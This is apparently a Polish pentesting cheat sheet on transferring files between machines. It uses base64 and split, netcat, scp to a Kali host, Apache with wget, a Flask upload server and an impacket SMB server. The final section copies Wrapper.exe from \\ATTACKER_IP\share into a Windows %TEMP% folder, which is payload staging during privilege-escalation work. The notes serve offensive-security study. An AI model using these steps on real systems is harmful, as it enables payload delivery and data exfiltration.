# Content
1. [Podzial na fragmenty](#Podzial-na-fragmenty)
2. [Przeslanie nc](#Przeslanie-nc)
3. [Przeslanie przez ssh scp](#Przeslanie-przez-ssh-scp)
4. [Apache](#Apache)
5. [Upload flask](#Upload-flask)
6. [Using SMB server](#SMB-server)

# Podzial na fragmenty
### Mozna przed podzieleniem zakodowac do base64
```console
base64 -w file.ext > file_to_split
```
### Dobry sposob
Podzielenie na ilosc partii
```console
split -n 20 file_to_split
```
Zlaczenie podzielonych kawalkow
```console
cat x* > scale_file
```
### Pierwotna wersja
![](PodzielenieNaMniejszeFragmenty.png)



# Przeslanie nc
### Nasluch
```console
nc -nlvp 9999 > dane
```
### Wyslanie
```console
nc -n <ip> 9999 < file
```


# Przeslanie przez ssh scp
### Przeslanie
```console
scp file.ext kali@192.168.45.193:/tmp
```
### Pobranie pliku przez ssh
```console
scp kali@192.168.45.250:/home/kali/Desktop/ticket.doc ticket.doc
```

# Apache
Kopiujemy plik do /var/www/html
```console
systemctl start apache2
```
Pobieramy plik na innej maszynie
```console
wget http://naszeIP/zasob
```

# Upload flask
```console
git clone https://github.com/romeokienzler/flask-file-upload.git
```
```console
mv upload.py app.py
```
```console
flask run
```
Connect i browser **127.0.0.1:5000**

# SMB server
    Uruchamiamy server na kalim:
    sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
    
    Na windowsie 
    1) Podlaczamy zasow:
       1- net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
    2) Kopiujemy pliki
       1- copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
    3) Odlaczamy zasob
       1- net use \\ATTACKER_IP\share /del
    
    Tutaj takie cos bylo robione(Uprawnienia windows)
